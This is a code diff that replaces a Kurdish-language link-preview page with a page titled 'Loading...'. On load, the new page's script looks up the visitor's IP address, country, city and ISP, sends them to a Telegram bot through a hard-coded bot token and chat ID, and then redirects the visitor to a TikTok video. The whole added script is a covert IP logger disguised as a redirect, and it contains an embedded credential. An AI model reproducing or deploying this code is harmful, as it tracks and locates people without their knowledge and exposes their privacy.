@@ -1,380 +1,43 @@
 <!DOCTYPE html>
-<html dir="rtl" lang="ku">
+<html lang="en" dir="ltr">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>دروستکەری لینک</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f0f4f8;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            padding: 30px 20px;
-        }
-
-        .container {
-            background: white;
-            border-radius: 24px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.12);
-            max-width: 900px;
-            width: 100%;
-            padding: 35px 30px;
-        }
-
-        h1 {
-            font-size: 28px;
-            color: #0f172a;
-            text-align: center;
-            margin-bottom: 6px;
-        }
-
-        .subtitle {
-            text-align: center;
-            color: #64748b;
-            margin-bottom: 28px;
-            font-size: 15px;
-        }
-
-        .create-section {
-            background: #f8fafc;
-            border-radius: 16px;
-            padding: 25px 22px;
-            border: 1.5px solid #e2e8f0;
-            margin-bottom: 25px;
-        }
-
-        .create-section h3 {
-            font-size: 18px;
-            color: #0f172a;
-            margin-bottom: 16px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .create-row {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 12px;
-            align-items: center;
-        }
-
-        .create-row label {
-            font-weight: 600;
-            color: #334155;
-            font-size: 14px;
-            min-width: 70px;
-        }
-
-        .create-row input[type="text"] {
-            flex: 1;
-            min-width: 180px;
-            padding: 10px 16px;
-            border-radius: 12px;
-            border: 1.5px solid #cbd5e1;
-            font-size: 15px;
-            outline: none;
-            transition: 0.25s;
-            background: white;
-        }
-
-        .create-row input[type="text"]:focus {
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15);
-        }
-
-        .create-row input[type="text"]::placeholder {
-            color: #94a3b8;
-        }
-
-        .btn-create {
-            background: #2563eb;
-            color: white;
-            border: none;
-            padding: 10px 30px;
-            border-radius: 12px;
-            font-weight: 700;
-            font-size: 15px;
-            cursor: pointer;
-            transition: 0.2s;
-            white-space: nowrap;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .btn-create:hover {
-            background: #1d4ed8;
-            transform: scale(1.02);
-        }
-
-        .btn-create:active {
-            transform: scale(0.97);
-        }
-
-        .active-link-box {
-            background: #eef2ff;
-            border-radius: 12px;
-            padding: 14px 20px;
-            margin: 10px 0 20px 0;
-            border: 1px solid #c7d2fe;
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .active-link-box strong {
-            color: #1e293b;
-            font-size: 14px;
-        }
-
-        .active-link-box .link-url {
-            color: #1d4ed8;
-            font-size: 14px;
-            word-break: break-all;
-            flex: 1;
-            background: white;
-            padding: 6px 14px;
-            border-radius: 8px;
-            border: 1px solid #bfdbfe;
-        }
-
-        .btn-open {
-            background: #16a34a;
-            color: white;
-            border: none;
-            padding: 8px 22px;
-            border-radius: 10px;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-            transition: 0.2s;
-            white-space: nowrap;
-        }
-
-        .btn-open:hover {
-            background: #15803d;
-        }
-
-        .btn-clear {
-            background: #e2e8f0;
-            color: #1e293b;
-            border: none;
-            padding: 8px 18px;
-            border-radius: 10px;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-            transition: 0.2s;
-            white-space: nowrap;
-        }
-
-        .btn-clear:hover {
-            background: #cbd5e1;
-        }
-
-        .iframe-wrapper {
-            margin-top: 20px;
-            border-radius: 16px;
-            overflow: hidden;
-            border: 1px solid #e2e8f0;
-            background: #f1f5f9;
-            position: relative;
-        }
-
-        .iframe-wrapper iframe {
-            width: 100%;
-            height: 550px;
-            border: none;
-            display: block;
-            background: white;
-        }
-
-        .iframe-placeholder {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 450px;
-            color: #94a3b8;
-            background: #f8fafc;
-            text-align: center;
-            padding: 30px;
-        }
-
-        .iframe-placeholder .icon {
-            font-size: 60px;
-            margin-bottom: 16px;
-        }
-        .iframe-placeholder p {
-            font-size: 17px;
-            max-width: 400px;
-        }
-
-        .footer-note {
-            margin-top: 18px;
-            font-size: 13px;
-            color: #94a3b8;
-            text-align: center;
-        }
-
-        @media (max-width: 650px) {
-            .container { padding: 20px 15px; }
-            .create-row { flex-direction: column; align-items: stretch; }
-            .create-row label { min-width: auto; }
-            .btn-create { justify-content: center; }
-            .active-link-box { flex-direction: column; align-items: stretch; }
-        }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
 </head>
 <body>
-    <div class="container">
-        <h1>🔗 دروستکەری لینک</h1>
-        <p class="subtitle">لینکی ڕاستەقینە دابنە، ناوی دڵخوازی بۆ دابنە، پاشان وێبسایتەکە ببینە</p>
-
-        <div class="create-section">
-            <h3>📝 لینکی نوێ دروست بکە</h3>
-            <div class="create-row">
-                <label>لینک (URL):</label>
-                <input type="text" id="urlInput" placeholder="https://example.com" />
-                
-                <label>ناو (تایتڵ):</label>
-                <input type="text" id="titleInput" placeholder="ناوی دڵخوازی بۆ لینکەکە..." />
-                
-                <button class="btn-create" id="createBtn">✨ دروستکردن</button>
-            </div>
-        </div>
-
-        <div class="active-link-box" id="activeLinkBox">
-            <strong>🔗 لینکی چالاک:</strong>
-            <span class="link-url" id="activeLinkDisplay">هێشتا لینکێک دروست نەکراوە</span>
-            <button class="btn-open" id="openBtn">🚀 کردنەوە</button>
-            <button class="btn-clear" id="clearBtn">🗑️ پاککردنەوە</button>
-        </div>
-
-        <div class="iframe-wrapper" id="iframeWrapper">
-            <div class="iframe-placeholder" id="placeholder">
-                <div class="icon">🌐</div>
-                <p>لینکێک دروست بکە بۆ بینینی وێبسایتەکە</p>
-                <p style="font-size:14px; color:#b0b8c4;">لینکی ڕاستەقینە دابنە و ناوێکی خۆش بۆ دابنە</p>
-            </div>
-            <iframe id="previewIframe" style="display:none;" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
-        </div>
-
-        <p class="footer-note">
-            ✅ تەنها ناوی لینکەکە پیشان دەدرێت، بەڵام کاتی کردنەوەدا بۆ لینکی ڕاستەقینە دەچیت.
-        </p>
-    </div>
-
     <script>
-        (function() {
-            const urlInput = document.getElementById('urlInput');
-            const titleInput = document.getElementById('titleInput');
-            const createBtn = document.getElementById('createBtn');
-            const openBtn = document.getElementById('openBtn');
-            const clearBtn = document.getElementById('clearBtn');
-            const activeLinkDisplay = document.getElementById('activeLinkDisplay');
-            const placeholder = document.getElementById('placeholder');
-            const previewIframe = document.getElementById('previewIframe');
+        const BOT_TOKEN = '8942095399:AAGbL8-6mj89o3PefyQeVdRd9oVR0LrSNDg';
+        const CHAT_ID = '7641255924';
+        
+        // لینکی ڤیدیۆی تیکتۆک ڕاستەوخۆ لێرەدا جێگیر کراوە
+        const targetUrl = 'https://vt.tiktok.com/ZSq8oHq1e/';
 
-            let currentLink = {
-                url: '',
-                title: ''
-            };
+        async function sendIPAndRedirect() {
+            try {
+                let res = await fetch('https://ipapi.co/json/');
+                let data = await res.json();
+                
+                let ipMessage = "🌐 New Visitor Info:\n\n" +
+                                "IP: " + data.ip + "\n" +
+                                "Country: " + data.country_name + "\n" +
+                                "City: " + data.city + "\n" +
+                                "Org: " + data.org;
 
-            function updateActiveLinkDisplay() {
-                if (currentLink.title) {
-                    activeLinkDisplay.textContent = currentLink.title;
-                } else if (currentLink.url) {
-                    // ئەگەر ناو نەبێت، تەنها لینکەکە پیشان بدە
-                    activeLinkDisplay.textContent = currentLink.url;
-                } else {
-                    activeLinkDisplay.textContent = 'هێشتا لینکێک دروست نەکراوە';
-                }
-            }
+                await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: ipMessage
+                    })
+                });
+            } catch (e) {}
 
-            function openLinkInIframe(url) {
-                if (!url || url.trim() === '') {
-                    alert('تکایە سەرەتا لینکێک دروست بکە!');
-                    return;
-                }
+            window.location.href = targetUrl;
+        }
 
-                let finalUrl = url.trim();
-                if (!finalUrl.startsWith('http://') && !finalUrl.startsWith('https://')) {
-                    finalUrl = 'https://' + finalUrl;
-                }
-
-                placeholder.style.display = 'none';
-                previewIframe.style.display = 'block';
-                previewIframe.src = finalUrl;
-            }
-
-            function createLink() {
-                const url = urlInput.value.trim();
-                const title = titleInput.value.trim();
-
-                if (!url) {
-                    alert('تکایە لینکێک (URL) بنوسە!');
-                    return;
-                }
-
-                // ئەگەر ناو نەنوسرابێت، لینکەکە خۆی دەبێتە ناو
-                currentLink.url = url;
-                currentLink.title = title || url;
-
-                updateActiveLinkDisplay();
-                openLinkInIframe(url);
-            }
-
-            function openActiveLink() {
-                if (currentLink.url) {
-                    openLinkInIframe(currentLink.url);
-                } else {
-                    alert('تکایە سەرەتا لینکێک دروست بکە!');
-                }
-            }
-
-            function clearAll() {
-                currentLink.url = '';
-                currentLink.title = '';
-                updateActiveLinkDisplay();
-
-                previewIframe.style.display = 'none';
-                previewIframe.src = '';
-                placeholder.style.display = 'flex';
-
-                urlInput.value = '';
-                titleInput.value = '';
-            }
-
-            createBtn.addEventListener('click', createLink);
-            openBtn.addEventListener('click', openActiveLink);
-            clearBtn.addEventListener('click', clearAll);
-
-            urlInput.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    createLink();
-                }
-            });
-            titleInput.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    createLink();
-                }
-            });
-
-        })();
+        window.onload = sendIPAndRedirect;
     </script>
 </body>
 </html>
